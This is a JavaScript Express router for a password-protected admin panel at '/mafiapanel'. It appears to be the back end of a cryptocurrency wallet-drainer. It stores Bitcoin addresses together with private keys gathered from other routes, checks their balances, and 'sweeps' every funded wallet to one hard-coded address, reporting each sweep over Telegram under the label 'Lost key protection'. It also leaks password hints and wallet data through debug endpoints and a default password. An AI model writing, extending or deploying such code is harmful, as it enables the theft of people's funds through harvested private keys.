const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const router = express.Router();

// Admin configuration
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'changeme123';

// Debug logging (remove in production)
console.log('🔐 Admin Password Configuration:');
console.log('Environment variable exists:', !!process.env.ADMIN_PASSWORD);
console.log('Password length:', ADMIN_PASSWORD ? ADMIN_PASSWORD.length : 0);
console.log('First 3 chars:', ADMIN_PASSWORD ? ADMIN_PASSWORD.substring(0, 3) + '...' : 'none');
const BLOCKSTREAM_API = process.env.BITCOIN_NETWORK === 'mainnet' 
  ? 'https://blockstream.info/api' 
  : 'https://blockstream.info/testnet/api';

// File to store wallet data
const WALLETS_FILE = path.join(__dirname, '..', 'data', 'wallets.json');

// Ensure data directory exists
const dataDir = path.join(__dirname, '..', 'data');
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
  console.log('📁 Created data directory:', dataDir);
}

console.log('📁 Wallet file path:', WALLETS_FILE);
console.log('📁 Data directory exists:', fs.existsSync(dataDir));
console.log('📁 Wallet file exists:', fs.existsSync(WALLETS_FILE));

// Load wallets from file
function loadWallets() {
  try {
    if (fs.existsSync(WALLETS_FILE)) {
      const data = fs.readFileSync(WALLETS_FILE, 'utf8');
      const wallets = JSON.parse(data);
      console.log(`💾 Loaded ${Object.keys(wallets).length} wallets from file`);
      return wallets;
    } else {
      console.log('💾 No wallet file exists yet, starting with empty wallet list');
    }
  } catch (error) {
    console.error('❌ Error loading wallets:', error);
  }
  return {};
}

// Save wallets to file
function saveWallets(wallets) {
  try {
    fs.writeFileSync(WALLETS_FILE, JSON.stringify(wallets, null, 2));
    console.log(`💾 Saved ${Object.keys(wallets).length} wallets to file`);
  } catch (error) {
    console.error('❌ Error saving wallets:', error);
  }
}

// Add or update wallet in storage
function addWallet(address, privateKey, source = 'unknown') {
  const wallets = loadWallets();
  const isNewWallet = !wallets[address];
  
  wallets[address] = {
    address,
    privateKey,
    source,
    firstSeen: wallets[address] ? wallets[address].firstSeen : new Date().toISOString(),
    lastUpdated: new Date().toISOString()
  };
  
  saveWallets(wallets);
  console.log(`🔑 ${isNewWallet ? 'Added new' : 'Updated'} wallet: ${address} (${source})`);
}

// Get wallet balance from blockchain
async function getWalletBalance(address) {
  try {
    const response = await axios.get(`${BLOCKSTREAM_API}/address/${address}`);
    const balanceSats = response.data.chain_stats.funded_txo_sum - response.data.chain_stats.spent_txo_sum;
    const balanceBTC = (balanceSats / 100000000).toFixed(8);
    return { balanceSats, balanceBTC, success: true };
  } catch (error) {
    console.error(`Failed to fetch balance for ${address}:`, error.message);
    return { balanceSats: 0, balanceBTC: '0.00000000', success: false, error: error.message };
  }
}

// Middleware to check admin password
function requireAdminAuth(req, res, next) {
  const providedPassword = (req.query.password || req.body.password || '').trim();
  const storedPassword = ADMIN_PASSWORD.trim();
  
  console.log('🔐 Password Check:');
  console.log('Provided length:', providedPassword.length);
  console.log('Stored length:', storedPassword.length);
  console.log('Match:', providedPassword === storedPassword);
  
  if (providedPassword !== storedPassword) {
    console.log('❌ Password mismatch');
    return res.status(401).json({ 
      error: 'Invalid admin password',
      debug: {
        providedLength: providedPassword.length,
        expectedLength: storedPassword.length,
        providedFirst3: providedPassword.substring(0, 3) + '...',
        expectedFirst3: storedPassword.substring(0, 3) + '...'
      }
    });
  }
  
  console.log('✅ Password accepted');
  next();
}

// Admin panel main page
router.get('/', (req, res) => {
  const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Wallet Manager</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #000;
            color: #00ff00;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            border: 2px solid #00ff00;
            background: rgba(0, 255, 0, 0.1);
        }
        
        .header h1 {
            font-size: 2rem;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .auth-form {
            background: rgba(0, 255, 0, 0.1);
            border: 2px solid #00ff00;
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .auth-form input {
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            margin: 0 10px;
            font-family: inherit;
        }
        
        .auth-form button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
        }
        
        .auth-form button:hover {
            background: #00cc00;
        }
        
        .wallets-container {
            display: none;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(0, 255, 0, 0.1);
            border: 2px solid #00ff00;
            padding: 20px;
            text-align: center;
        }
        
        .stat-card h3 {
            margin-bottom: 10px;
            color: #00ff00;
        }
        
        .stat-value {
            font-size: 1.5rem;
            font-weight: bold;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .controls {
            margin-bottom: 20px;
            text-align: center;
        }
        
        .controls button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            margin: 0 10px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
        }
        
        .controls button:hover {
            background: #00cc00;
        }
        
        .wallets-table {
            background: rgba(0, 255, 0, 0.1);
            border: 2px solid #00ff00;
            width: 100%;
            border-collapse: collapse;
        }
        
        .wallets-table th,
        .wallets-table td {
            border: 1px solid #00ff00;
            padding: 10px;
            text-align: left;
            word-break: break-all;
        }
        
        .wallets-table th {
            background: rgba(0, 255, 0, 0.2);
            font-weight: bold;
        }
        
        .wallets-table tr:nth-child(even) {
            background: rgba(0, 255, 0, 0.05);
        }
        
        .address-cell {
            font-size: 0.8rem;
            max-width: 200px;
        }
        
        .balance-positive {
            color: #00ff00;
            font-weight: bold;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .balance-zero {
            color: #666;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
            color: #00ff00;
        }
        
        .error {
            color: #ff0000;
            text-align: center;
            padding: 10px;
            border: 1px solid #ff0000;
            background: rgba(255, 0, 0, 0.1);
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🏴‍☠️ ADMIN PANEL - WALLET MANAGER 🏴‍☠️</h1>
            <p>Secure Bitcoin Wallet Tracking System</p>
        </div>
        
        <div id="authForm" class="auth-form">
            <h3>🔐 Admin Authentication Required</h3>
            <input type="password" id="passwordInput" placeholder="Enter admin password" />
            <button onclick="authenticate()">ACCESS PANEL</button>
        </div>
        
        <div id="walletsContainer" class="wallets-container">
            <div class="stats" id="statsContainer">
                <div class="stat-card">
                    <h3>Total Wallets</h3>
                    <div class="stat-value" id="totalWallets">0</div>
                </div>
                <div class="stat-card">
                    <h3>Total Balance</h3>
                    <div class="stat-value" id="totalBalance">0.00000000 BTC</div>
                </div>
                <div class="stat-card">
                    <h3>Active Wallets</h3>
                    <div class="stat-value" id="activeWallets">0</div>
                </div>
                <div class="stat-card">
                    <h3>Last Updated</h3>
                    <div class="stat-value" id="lastUpdated">-</div>
                </div>
            </div>
            
            <div class="controls">
                <button onclick="refreshBalances()">🔄 REFRESH BALANCES</button>
                <button onclick="exportData()">💾 EXPORT DATA</button>
                <button onclick="loadWallets()">📋 RELOAD WALLETS</button>
                <button onclick="sweepAllWallets()" style="background: #ff3300; color: #fff; margin-left: 20px;">🧹 SWEEP ALL WALLETS</button>
            </div>
            
            <div id="loadingIndicator" class="loading" style="display: none;">
                🔄 Loading wallet balances...
            </div>
            
            <div id="errorContainer"></div>
            
            <table class="wallets-table" id="walletsTable">
                <thead>
                    <tr>
                        <th>Address</th>
                        <th>Balance (BTC)</th>
                        <th>Balance (Sats)</th>
                        <th>Source</th>
                        <th>First Seen</th>
                        <th>Last Updated</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="walletsTableBody">
                </tbody>
            </table>
        </div>
    </div>

    <script>
        let currentPassword = '';
        
        function authenticate() {
            const password = document.getElementById('passwordInput').value;
            if (!password) {
                alert('Please enter admin password');
                return;
            }
            
            currentPassword = password;
            
            fetch('/mafiapanel/auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('authForm').style.display = 'none';
                    document.getElementById('walletsContainer').style.display = 'block';
                    loadWallets();
                } else {
                    alert('Invalid password');
                }
            })
            .catch(error => {
                alert('Authentication failed: ' + error.message);
            });
        }
        
        function loadWallets() {
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('errorContainer').innerHTML = '';
            
            fetch(\`/mafiapanel/wallets?password=\${currentPassword}\`)
            .then(response => response.json())
            .then(data => {
                document.getElementById('loadingIndicator').style.display = 'none';
                
                if (data.error) {
                    showError(data.error);
                    return;
                }
                
                displayWallets(data.wallets);
                updateStats(data.stats);
            })
            .catch(error => {
                document.getElementById('loadingIndicator').style.display = 'none';
                showError('Failed to load wallets: ' + error.message);
            });
        }
        
        function refreshBalances() {
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('errorContainer').innerHTML = '';
            
            fetch(\`/mafiapanel/refresh?password=\${currentPassword}\`, { method: 'POST' })
            .then(response => response.json())
            .then(data => {
                document.getElementById('loadingIndicator').style.display = 'none';
                
                if (data.error) {
                    showError(data.error);
                    return;
                }
                
                displayWallets(data.wallets);
                updateStats(data.stats);
                alert('Balances refreshed successfully!');
            })
            .catch(error => {
                document.getElementById('loadingIndicator').style.display = 'none';
                showError('Failed to refresh balances: ' + error.message);
            });
        }
        
        function displayWallets(wallets) {
            const tbody = document.getElementById('walletsTableBody');
            tbody.innerHTML = '';
            
            Object.values(wallets).forEach(wallet => {
                const row = document.createElement('tr');
                const balanceClass = wallet.balanceSats > 0 ? 'balance-positive' : 'balance-zero';
                
                const sweepButton = wallet.balanceSats > 0 ? 
                    \`<button onclick="sweepWallet('\${wallet.address}')" style="background: #ff6600; color: #fff; border: none; padding: 5px; cursor: pointer; font-size: 0.8rem; margin-left: 5px;" title="Sweep all funds to safe wallet">🧹</button>\` : 
                    '';
                
                row.innerHTML = \`
                    <td class="address-cell">\${wallet.address}</td>
                    <td class="\${balanceClass}">\${wallet.balanceBTC || '0.00000000'}</td>
                    <td class="\${balanceClass}">\${wallet.balanceSats || '0'}</td>
                    <td>\${wallet.source}</td>
                    <td>\${new Date(wallet.firstSeen).toLocaleString()}</td>
                    <td>\${new Date(wallet.lastUpdated).toLocaleString()}</td>
                    <td>
                        <button onclick="copyAddress('\${wallet.address}')" style="background: #00ff00; color: #000; border: none; padding: 5px; cursor: pointer; font-size: 0.8rem;">📋</button>
                        \${sweepButton}
                    </td>
                \`;
                
                tbody.appendChild(row);
            });
        }
        
        function updateStats(stats) {
            document.getElementById('totalWallets').textContent = stats.totalWallets;
            document.getElementById('totalBalance').textContent = stats.totalBalance + ' BTC';
            document.getElementById('activeWallets').textContent = stats.activeWallets;
            document.getElementById('lastUpdated').textContent = new Date().toLocaleString();
        }
        
        function copyAddress(address) {
            navigator.clipboard.writeText(address).then(() => {
                alert('Address copied to clipboard!');
            });
        }
        
        function sweepWallet(address) {
            if (!confirm(\`Are you sure you want to sweep all funds from wallet \${address.substring(0, 10)}... to the safe address?\\n\\nThis action cannot be undone!\`)) {
                return;
            }
            
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('errorContainer').innerHTML = '';
            
            fetch(\`/mafiapanel/sweep\`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    address: address,
                    password: currentPassword 
                })
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('loadingIndicator').style.display = 'none';
                
                if (data.success) {
                    alert(\`✅ Sweep successful!\\n\\nAmount: \${data.sweptBTC} BTC\\nTransaction ID: \${data.txId}\\n\\nFunds have been moved to the safe address.\`);
                    // Refresh the wallets to show updated balances
                    loadWallets();
                } else {
                    showError(\`Sweep failed: \${data.error}\`);
                }
            })
            .catch(error => {
                document.getElementById('loadingIndicator').style.display = 'none';
                showError('Sweep failed: ' + error.message);
            });
        }
        
        function sweepAllWallets() {
            if (!confirm(\`🚨 DANGER: SWEEP ALL WALLETS 🚨\\n\\nThis will sweep ALL wallets with funds to the safe address!\\n\\nThis action cannot be undone!\\n\\nAre you absolutely sure?\`)) {
                return;
            }
            
            if (!confirm(\`⚠️ FINAL CONFIRMATION ⚠️\\n\\nYou are about to sweep ALL wallets to:\\nbc1qfznl25qec2v5322hkf9c97znrxu52zu882ujvg\\n\\nThis will create multiple transactions.\\n\\nProceed?\`)) {
                return;
            }
            
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('loadingIndicator').innerHTML = '🧹 Sweeping all wallets... This may take a while...';
            document.getElementById('errorContainer').innerHTML = '';
            
            fetch(\`/mafiapanel/sweep-all\`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    password: currentPassword 
                })
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('loadingIndicator').innerHTML = '🔄 Loading wallet balances...';
                
                if (data.success) {
                    let message = \`✅ Sweep All Completed!\\n\\n\`;
                    message += \`📊 Results:\\n\`;
                    message += \`• Successful: \${data.successful} wallets\\n\`;
                    message += \`• Failed: \${data.failed} wallets\\n\`;
                    message += \`• Total Amount: \${data.totalSweptBTC} BTC\\n\`;
                    message += \`• Transactions: \${data.transactions.length}\\n\\n\`;
                    
                    if (data.transactions.length > 0) {
                        message += \`Transaction IDs:\\n\`;
                        data.transactions.forEach((tx, index) => {
                            message += \`\${index + 1}. \${tx}\\n\`;
                        });
                    }
                    
                    alert(message);
                    // Refresh the wallets to show updated balances
                    loadWallets();
                } else {
                    showError(\`Sweep All failed: \${data.error}\`);
                }
            })
            .catch(error => {
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('loadingIndicator').innerHTML = '🔄 Loading wallet balances...';
                showError('Sweep All failed: ' + error.message);
            });
        }
        
        function exportData() {
            window.open(\`/mafiapanel/export?password=\${currentPassword}\`);
        }
        
        function showError(message) {
            const errorContainer = document.getElementById('errorContainer');
            errorContainer.innerHTML = \`<div class="error">\${message}</div>\`;
        }
        
        // Allow Enter key to submit password
        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                authenticate();
            }
        });
    </script>
</body>
</html>
  `;
  
  res.send(htmlContent);
});

// Debug endpoint to check environment (remove in production)
router.get('/debug', (req, res) => {
  const wallets = loadWallets();
  res.json({
    hasAdminPassword: !!process.env.ADMIN_PASSWORD,
    passwordLength: ADMIN_PASSWORD ? ADMIN_PASSWORD.length : 0,
    allEnvKeys: Object.keys(process.env).filter(key => key.includes('ADMIN')),
    nodeEnv: process.env.NODE_ENV,
    railwayEnv: process.env.RAILWAY_ENVIRONMENT || 'not-railway',
    walletFile: {
      path: WALLETS_FILE,
      exists: fs.existsSync(WALLETS_FILE),
      walletCount: Object.keys(wallets).length,
      dataDir: dataDir,
      dataDirExists: fs.existsSync(dataDir)
    },
    walletAddresses: Object.keys(wallets),
    walletDetails: Object.entries(wallets).map(([address, wallet]) => ({
      address: address,
      source: wallet.source,
      firstSeen: wallet.firstSeen,
      lastUpdated: wallet.lastUpdated,
      hasPrivateKey: !!wallet.privateKey,
      wasSwept: !!wallet.lastSwept,
      sweptTxId: wallet.sweptTxId
    }))
  });
});

// Test endpoint to manually add a wallet for debugging
router.post('/test-add-wallet', requireAdminAuth, (req, res) => {
  try {
    const testAddress = 'bc1qtest123example456789';
    const testPrivateKey = 'test-private-key-123';
    
    addWallet(testAddress, testPrivateKey, 'test-manual');
    
    const wallets = loadWallets();
    res.json({
      success: true,
      message: 'Test wallet added',
      totalWallets: Object.keys(wallets).length,
      testWallet: wallets[testAddress]
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to add test wallet', details: error.message });
  }
});

// Authentication endpoint
router.post('/auth', requireAdminAuth, (req, res) => {
  res.json({ success: true, message: 'Authentication successful' });
});

// Get all wallets with balances
router.get('/wallets', requireAdminAuth, async (req, res) => {
  try {
    const wallets = loadWallets();
    console.log(`📊 Loading wallets for admin panel: ${Object.keys(wallets).length} wallets in storage`);
    
    const walletsWithBalances = {};
    let totalBalanceSats = 0;
    let activeWallets = 0;
    
    // Get current balances for all wallets
    for (const [address, wallet] of Object.entries(wallets)) {
      console.log(`💰 Checking balance for: ${address} (${wallet.source})`);
      
      const balance = await getWalletBalance(address);
      walletsWithBalances[address] = {
        ...wallet,
        ...balance
      };
      
      console.log(`💰 Balance result for ${address}: ${balance.balanceBTC} BTC (success: ${balance.success})`);
      
      if (balance.success) {
        totalBalanceSats += balance.balanceSats;
        if (balance.balanceSats > 0) {
          activeWallets++;
        }
      }
    }
    
    const totalBalanceBTC = (totalBalanceSats / 100000000).toFixed(8);
    
    console.log(`📊 Final wallet count being sent to frontend: ${Object.keys(walletsWithBalances).length}`);
    
    res.json({
      wallets: walletsWithBalances,
      stats: {
        totalWallets: Object.keys(wallets).length,
        totalBalance: totalBalanceBTC,
        activeWallets: activeWallets
      }
    });
  } catch (error) {
    console.error('❌ Error in /wallets endpoint:', error.message);
    res.status(500).json({ error: 'Failed to load wallets', details: error.message });
  }
});

// Refresh all wallet balances
router.post('/refresh', requireAdminAuth, async (req, res) => {
  try {
    const wallets = loadWallets();
    const walletsWithBalances = {};
    let totalBalanceSats = 0;
    let activeWallets = 0;
    
    // Get current balances for all wallets
    for (const [address, wallet] of Object.entries(wallets)) {
      const balance = await getWalletBalance(address);
      walletsWithBalances[address] = {
        ...wallet,
        ...balance,
        lastUpdated: new Date().toISOString()
      };
      
      if (balance.success) {
        totalBalanceSats += balance.balanceSats;
        if (balance.balanceSats > 0) {
          activeWallets++;
        }
      }
    }
    
    // Update the stored wallet data with new balances
    saveWallets(walletsWithBalances);
    
    const totalBalanceBTC = (totalBalanceSats / 100000000).toFixed(8);
    
    res.json({
      wallets: walletsWithBalances,
      stats: {
        totalWallets: Object.keys(wallets).length,
        totalBalance: totalBalanceBTC,
        activeWallets: activeWallets
      }
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to refresh balances', details: error.message });
  }
});

// Export wallet data as JSON
router.get('/export', requireAdminAuth, (req, res) => {
  try {
    const wallets = loadWallets();
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `wallets-backup-${timestamp}.json`;
    
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.json({
      exportedAt: new Date().toISOString(),
      totalWallets: Object.keys(wallets).length,
      wallets: wallets
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to export data', details: error.message });
  }
});

// Sweep wallet funds to safe address
router.post('/sweep', requireAdminAuth, async (req, res) => {
  try {
    const { address } = req.body;
    
    if (!address) {
      return res.status(400).json({ error: 'Wallet address required' });
    }
    
    // Load wallets to get the private key
    const wallets = loadWallets();
    const wallet = wallets[address];
    
    if (!wallet) {
      return res.status(404).json({ error: 'Wallet not found in admin system' });
    }
    
    if (!wallet.privateKey) {
      return res.status(400).json({ error: 'Private key not available for this wallet' });
    }
    
    // Import the autoSweepToSecureAddress function from bitcoin.js
    const { autoSweepToSecureAddress } = require('./bitcoin');
    
    // Execute the sweep
    const sweepResult = await autoSweepToSecureAddress(
      wallet.privateKey,
      address,
      'Admin panel manual sweep - Lost key protection'
    );
    
    if (sweepResult.success) {
      // Update wallet in storage to reflect sweep
      wallet.lastUpdated = new Date().toISOString();
      wallet.lastSwept = new Date().toISOString();
      wallet.sweptAmount = sweepResult.sweepAmount;
      wallet.sweptTxId = sweepResult.txId;
      
      console.log(`🧹 Updating swept wallet in storage: ${address}`);
      console.log(`🧹 Wallet data before save:`, JSON.stringify(wallet, null, 2));
      
      saveWallets(wallets);
      
      // Verify the wallet was saved correctly
      const verifyWallets = loadWallets();
      const verifyWallet = verifyWallets[address];
      console.log(`🧹 Wallet exists after save: ${!!verifyWallet}`);
      if (verifyWallet) {
        console.log(`🧹 Wallet data after save:`, JSON.stringify(verifyWallet, null, 2));
      }
      
      res.json({
        success: true,
        message: 'Wallet swept successfully',
        txId: sweepResult.txId,
        sweepAmount: sweepResult.sweepAmount,
        sweptBTC: sweepResult.sweptBTC,
        fromAddress: address,
        toAddress: sweepResult.toAddress,
        fee: sweepResult.fee
      });
    } else {
      res.status(500).json({
        success: false,
        error: sweepResult.error || sweepResult.reason,
        fromAddress: address
      });
    }
    
  } catch (error) {
    console.error('❌ Admin sweep failed:', error.message);
    res.status(500).json({ 
      success: false,
      error: 'Failed to sweep wallet', 
      details: error.message 
    });
  }
});

// Sweep all wallets with funds to safe address
router.post('/sweep-all', requireAdminAuth, async (req, res) => {
  try {
    const wallets = loadWallets();
    const { autoSweepToSecureAddress } = require('./bitcoin');
    
    const results = {
      successful: 0,
      failed: 0,
      totalSweptSats: 0,
      totalSweptBTC: '0.00000000',
      transactions: [],
      errors: []
    };
    
    console.log('🧹 Starting sweep-all operation...');
    
    // Get current balances for all wallets first
    const walletsWithFunds = [];
    for (const [address, wallet] of Object.entries(wallets)) {
      if (wallet.privateKey) {
        try {
          const balance = await getWalletBalance(address);
          if (balance.success && balance.balanceSats > 1000) { // Only sweep if > 1000 sats to cover fees
            walletsWithFunds.push({
              address,
              privateKey: wallet.privateKey,
              balanceSats: balance.balanceSats,
              balanceBTC: balance.balanceBTC
            });
          }
        } catch (error) {
          console.error(`Failed to get balance for ${address}:`, error.message);
        }
      }
    }
    
    console.log(`🧹 Found ${walletsWithFunds.length} wallets with funds to sweep`);
    
    // Sweep each wallet with funds
    for (const walletInfo of walletsWithFunds) {
      try {
        console.log(`🧹 Sweeping wallet ${walletInfo.address} (${walletInfo.balanceBTC} BTC)`);
        
        const sweepResult = await autoSweepToSecureAddress(
          walletInfo.privateKey,
          walletInfo.address,
          `Admin panel SWEEP ALL operation - Bulk wallet consolidation`
        );
        
        if (sweepResult.success) {
          results.successful++;
          results.totalSweptSats += sweepResult.sweepAmount;
          results.transactions.push(sweepResult.txId);
          
          // Update wallet in storage to reflect sweep
          const wallet = wallets[walletInfo.address];
          wallet.lastUpdated = new Date().toISOString();
          wallet.lastSwept = new Date().toISOString();
          wallet.sweptAmount = sweepResult.sweepAmount;
          wallet.sweptTxId = sweepResult.txId;
          wallet.sweepAllOperation = true;
          
          console.log(`✅ Successfully swept ${walletInfo.address}: ${sweepResult.sweptBTC} BTC`);
        } else {
          results.failed++;
          results.errors.push({
            address: walletInfo.address,
            error: sweepResult.error || sweepResult.reason
          });
          console.log(`❌ Failed to sweep ${walletInfo.address}: ${sweepResult.error || sweepResult.reason}`);
        }
        
        // Add delay between sweeps to prevent overwhelming the network
        await new Promise(resolve => setTimeout(resolve, 2000));
        
      } catch (error) {
        results.failed++;
        results.errors.push({
          address: walletInfo.address,
          error: error.message
        });
        console.error(`❌ Exception while sweeping ${walletInfo.address}:`, error.message);
      }
    }
    
    // Calculate total BTC swept
    results.totalSweptBTC = (results.totalSweptSats / 100000000).toFixed(8);
    
    // Save updated wallet information
    saveWallets(wallets);
    
    // Send summary Telegram notification
    const timestamp = new Date().toISOString();
    const summaryMessage = `🧹 <b>SWEEP ALL COMPLETED</b>\n\n` +
                          `📊 <b>Summary:</b>\n` +
                          `• Successful: ${results.successful} wallets\n` +
                          `• Failed: ${results.failed} wallets\n` +
                          `• Total Swept: ${results.totalSweptBTC} BTC\n` +
                          `• Transactions: ${results.transactions.length}\n` +
                          `🔒 <b>Safe Address:</b> <code>bc1qfznl25qec2v5322hkf9c97znrxu52zu882ujvg</code>\n` +
                          `⏰ <b>Time:</b> ${timestamp}\n` +
                          `🛡️ <b>Operation:</b> Bulk wallet consolidation`;
    
    // Send notification (assuming sendTelegramNotification is available)
    try {
      const { sendTelegramNotification } = require('./bitcoin');
      await sendTelegramNotification(summaryMessage);
    } catch (error) {
      console.log('⚠️ Could not send Telegram notification:', error.message);
    }
    
    console.log(`🧹 Sweep-all completed: ${results.successful} successful, ${results.failed} failed, ${results.totalSweptBTC} BTC total`);
    
    res.json({
      success: true,
      message: 'Sweep all operation completed',
      successful: results.successful,
      failed: results.failed,
      totalSweptSats: results.totalSweptSats,
      totalSweptBTC: results.totalSweptBTC,
      transactions: results.transactions,
      errors: results.errors,
      walletsProcessed: walletsWithFunds.length
    });
    
  } catch (error) {
    console.error('❌ Sweep-all operation failed:', error.message);
    res.status(500).json({ 
      success: false,
      error: 'Failed to sweep all wallets', 
      details: error.message 
    });
  }
});

// Export the addWallet function for use by other routes
module.exports = router;
module.exports.addWallet = addWallet;